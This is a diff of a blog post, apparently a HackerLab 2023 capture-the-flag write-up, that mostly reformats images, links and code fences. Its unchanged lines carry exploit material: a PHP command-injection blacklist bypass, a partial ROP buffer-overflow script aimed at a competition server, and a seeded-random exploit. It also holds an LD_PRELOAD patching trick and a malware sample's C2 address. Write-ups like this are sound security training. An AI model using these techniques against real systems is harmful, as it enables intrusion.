@@ -11,7 +11,7 @@ This year the competition was more intense than ever and my team `zer0ne` got pl
 
 Unfortunately I am currently very busy so I could not participate in the final
 
-{{< image src="/hackerlab2023/zero.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="zero.png" alt="hackerlab-2023" style="width:200px" >}}
 
 Here is a quick recapitulative writeup
 
@@ -25,16 +25,16 @@ It was a steg/crypto chall worth 50 points...The minimum points and I could not 
 We got a 20 megabyte "png" picture. Yup you heard that right...20 mega-fricking-bytes
 Original file not provided because...damn THAT'S BIG! Instead here is a converted version
 
-{{< image src="/hackerlab2023/ghezo.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="ghezo.png" alt="ghezo" style="width:200px" >}}
 
 could not be more suspicious so obviously we ran `file ghezo.png` to see it's actually a `netbpm pixmap` file
 the magic numbers are `P3` and the extension should be `.ppm`. This format is uncompressed and the funny thing is that
 P3 allow ascii encoding to represent pixel values. A-MA-ZING!
 
-I tried alot of things but could not manage this very unfamiliar file format so here is a script writen by 
+I tried alot of things but could not manage this very unfamiliar file format so here is a script written by
 [those awesome people](https://github.com/parfaittolefo/hackerlab2023/)
 
-```
+```python
 import re
 import numpy as np
 from PIL import Image
@@ -52,7 +52,7 @@ Image.fromarray(na).save("result.png")
 Basically this converts the ppm to a real png fixing the conspicuously modified image height
 which reveals colored pixels...
 
-{{< image src="/hackerlab2023/cut.bmp" alt="Hackerlab" position="left" >}}
+{{< post-img src="cut.bmp" alt="hexahue" style="width:200px" >}}
 
 The thing I needed to know at this very moment to solve this is `Hexahue alphabet`
 Damn this!
@@ -60,7 +60,7 @@ Damn this!
 # SPY (solved: 60pts)
 
 Ok this one was easy! Forensics (sorry for file not provided :p)
-Basicaly open the provided `mage.pdf` and download `The_magician.pdf` attachment
+Basically open the provided `mage.pdf` and download `The_magician.pdf` attachment
 pro tip: It's not a pdf
 Do some basic analysis (struggle first) then use `virustotal` for easier hindsights
 `url from memory patterns: tcp://172.28.13.26:7243`
@@ -68,9 +68,9 @@ Highly suspicious if you ask me
 
 # Asen hotagantin (unsolved: 70pts)
 
-{{< image src="/hackerlab2023/hotagantin.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="hotagantin.png" alt="hotagantin" style="width:200px" >}}
 
-You see this png? guess what...this is no png 
+You see this png? guess what...this is no png
 This is an `APNG` yes "A" stands for animated and this is cleverly delayed so it's hard to notice
 In the `exif metadata` you can see it's made using [EZGIF](https://ezgif.com) so just go there or use `apngdis`
 Anyway you get two frames and one is a `stereogram`...that's what I missed...the frickin' stereogram part
@@ -81,11 +81,11 @@ Just use `stegsolve`
 This one too was not hard! Web challenge!
 Basically code injection with blacklisting bypass. Code is even provided
 
-{{< image src="/hackerlab2023/php.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="php.png" alt="php" style="width:200px" >}}
 
 Just used my good old backtick (`ls`)
 
-{{< image src="/hackerlab2023/gj.png" alt="Hackerlab" position="left" >}}
+{{< post-img src="gj.png" alt="gj" style="width:200px" >}}
 
 # Tic tac toe (solved: 80pts)
 
@@ -95,8 +95,8 @@ Next is a bit tricky for web challenge but not hard. Experience is what helped m
 - Use `sourcemapper` (github) or anything else to "unmap" and get a clear js
 - notice in `App.vue` the commented out encrypt function
 - decode the AES...Here, like this...
-  
-```
+
+```js
 const CryptoJS = require('crypto-js');
 const k = '6cfad18816be65f2';
 const output = "U2FsdGVkX1/sPQHn8qbrD9LyPIipROeMnqke4B+JJEq8sVgV0zeA+ab2oHP92avnl2vzHVBs0/0NeOLbGmoj9g==";
@@ -117,9 +117,9 @@ here is the sauce: XOR with key = 5 (its...magic bro)
 This one was my favorite! (sorry again I deleted the binary file)
 Reverse chall and once again it was experience that saved me
 Elf64 making us wait for eternity using `sleep`...Been there done that
-Exemple of custom sleep library forged and called `nosleeplib.so`
+Example of custom sleep library forged and called `nosleeplib.so`
 
-```
+```c
 /* nosleep.c */
 #include <time.h>
 #include <unistd.h>
@@ -142,13 +142,13 @@ patch it with `LD_PRELOAD` and wait a reasonable amount of time for the flag
 # U.T.C (unsolved 100pts)
 
 Ok this one was quite cool but I could not solve this simplistic challenge
-Here look at the [server code](/hackerlab2023/utc.py)
+Here look at the [server code](utc.py)
 
 Yeah you noticed the use of `t = int(time.time())` and `random.seed(t)` too?
 I tried to bruteforce that...quite stupid you say? maybe! Actually the seeding makes it not-random-anymore
 Yup...basically...
 
-```
+```python
 import random
 from pwn import *
 
@@ -189,13 +189,13 @@ As I did not solve it I will simply provide a [link to my favorite solution](htt
 
 Pwn challenge I could not pwn [chall](/hackerlab2023/fa/chall)
 
-```
+```py
 from pwn import *
 
 context.binary = "chall"
 s = remote("54.37.70.250", 2002)
 s.sendafter(b": ",
-  b"a"*0x28 + 
+  b"a"*0x28 +
   p64(0x400b03) + # pop rdi
   p64(0x6010c0) + # username
   #p64(0x6010e0) + # password
@@ -211,12 +211,12 @@ I won't even try to explain just go [here](https://github.com/parfaittolefo/Hack
 
 This one was weird and fun but could not solve it too. Here are the pieces
 
-- [part 1](/hackerlab2023/puzzle/part1.fbx)
-- [part 2](/hackerlab2023/puzzle/part2.jpeg)
+- [part 1](puzzle/part1.fbx)
+- [part 2](puzzle/part2.jpeg)
 
 For part 2 I used cyberchef magic to retrieve this awesome cool photo of king behanzin
 
-{{< image src="/hackerlab2023/puzzle/behanzin.jpeg" alt="Hackerlab" position="left" >}}
+{{< post-img src="puzzle/behanzin.jpeg" alt="Hackerlab" style="width:200px" >}}
 
 Annnd then I got stuck...well I could not find a solution writeup yet so I will update this when available
 
@@ -224,17 +224,17 @@ Annnd then I got stuck...well I could not find a solution writeup yet so I will 
 
 # Qualification Stages
 
-This year they "gently suggested" everyone who solved the qualifs should write a writeup 
+This year they **"gently suggested"** everyone who solved the qualifs should write a writeup
 (mostly to filter cheating I guess)
-So I will simply provide links to those pdf (mine for those I solved and my favorite solutions for others
+So I will simply provide links to those pdf (mine for those I solved and my favorite solutions for others)
 
-- [Heviosso nou gué (solved: 250pts)](/hackerlab2023/heviosso-nou-gue.pdf)
+- [Heviosso nou gué (solved: 250pts)](heviosso-nou-gue.pdf)
 
-- [Agoodjie (solved: 300pts)](/hackerlab2023/agoodjie.pdf)
+- [Agoodjie (solved: 300pts)](agoodjie.pdf)
 
 Totally out of context but here is a beautiful image of AGOODJIE that was displayed on the challenge website
 
-{{< image src="/hackerlab2023/amazone.jpeg" alt="Hackerlab" position="left" >}}
+{{< post-img src="amazone.jpeg" alt="amazones" style="width:400px" >}}
 
 You needed to see it
 
@@ -247,7 +247,7 @@ You needed to see it
 
 ## END OF THE LINE!
 
-{{< image src="/hackerlab2023/rank.png" alt="my-scores" position="center" style="width: 300px;" >}}
+{{< post-img src="rank.png" alt="my-scores" style="width: 300px;" >}}
 
 I am very proud of my efforts this year as I could qualify for finals (kek)
 
